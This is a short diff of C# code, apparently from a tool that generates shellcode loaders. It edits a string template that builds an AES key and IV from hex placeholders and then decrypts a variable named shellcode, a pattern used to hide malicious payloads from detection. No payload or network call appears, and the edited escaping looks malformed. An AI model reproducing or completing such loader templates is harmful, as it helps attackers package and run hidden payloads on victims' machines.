@@ -260,8 +260,8 @@ namespace Ceramic
         {
             return @"
 
-            byte[] key = StringToByteArray(\\""\\HEX\\\HEX\\"".ToLower().Replace(\\""\\x\\\\"", \\""\\"").Replace(\\""\\\\\\"", \\""\\""));
-            byte[] iv = StringToByteArray(\\""\\5a\\34\\8e\\eb\\86\\1b\\53\\08\\66\\88\\03\\83\\f8\\95\\56\\ed\\"".ToLower().Replace(\\""\\x\\"", \\""\\"").Replace(\\""\\\\"", \\""\\""));
+            byte[] key = StringToByteArray(\\""\\HEX\\HEX\\"").ToLower().Replace(\\""\\x\\"", \\""\\"").Replace(\\""\\\\"", \\""\\""));
+            byte[] iv = StringToByteArray(\\""\\HEX\\HEX\\"").ToLower().Replace(\\""\\x\\"", \\""\\"").Replace(\\""\\\\"", \\""\\""));
 
             byte[] shellcode = AES.DecryptStringFromBytes_Aes(shellcode, key, iv);
 
